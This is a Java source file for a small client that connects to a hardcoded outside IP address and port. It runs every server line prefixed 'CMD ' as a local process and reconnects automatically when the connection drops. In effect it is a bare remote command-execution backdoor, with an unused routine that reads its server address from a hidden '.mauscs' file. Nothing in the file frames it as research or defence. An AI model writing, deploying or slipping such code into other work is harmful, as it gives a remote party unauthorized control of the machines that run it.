package Client;

import java.io.*;
import java.net.Socket;

public class Client {
    private static String HOST = "141.219.247.168";
    private static int PORT = 22122;
    private PrintWriter out;

    public static String getHOST() {
        return HOST;
    }

    public static void setHOST(String HOST) {
        Client.HOST = HOST;
    }

    public static int getPORT() {
        return PORT;
    }

    public static void setPORT(int PORT) {
        Client.PORT = PORT;
    }

    public static void main(String[] args) throws InterruptedException {
        new Client().connect();
    }

    private void connect() throws InterruptedException {
        try {
            Socket socket = new Socket(getHOST(), getPORT());
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new PrintWriter(socket.getOutputStream(), true);
            System.out.println("Client started: " + getHOST() + ":" + getPORT());
            String comm;
            while ((comm = in.readLine()) != null && !comm.contains("forciblyclose")) {
                comm = in.readLine();
                if (comm.contains("CMD ")) {
                    System.out.println(comm);
                    exec(comm.replace("CMD ", ""));
                }
                if (comm.equals("forciblyclose")) {
                    out.println("forciblyclose");
                }
            }
        } catch (IOException e) {
            System.out.println("Disconnected... retrying.");
            Thread.sleep(200);
            connect();
        }
    }

    private void communicate(String msg) {
        out.println(msg);
    }

    private void exec(String command) throws IOException {
        if (!command.equals("")) {
            System.out.println(command);
            ProcessBuilder pb = new ProcessBuilder(command);
            Process p = pb.start();
            BufferedReader stdInput = new BufferedReader(new
                    InputStreamReader(p.getInputStream()));
            BufferedReader stdError = new BufferedReader(new
                    InputStreamReader(p.getErrorStream()));
            String s;
            while ((s = stdInput.readLine()) != null) {
                System.out.println(s);
            }

            while ((s = stdError.readLine()) != null) {
                System.out.println(s);
            }
            communicate("end");
        }
    }

    private void loadServerSettings() {
        try (BufferedReader reader = new BufferedReader(new FileReader(".mauscs"))
        ) {
            String line;
            StringBuilder stringBuilder = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line);
            }
            String[] settings = stringBuilder.toString().split(" ");
            if (settings.length == 2) {
                setHOST(settings[0]);
                setPORT(Integer.parseInt(settings[1]));
            }
        } catch (IOException ignored) {
        }
    }
}
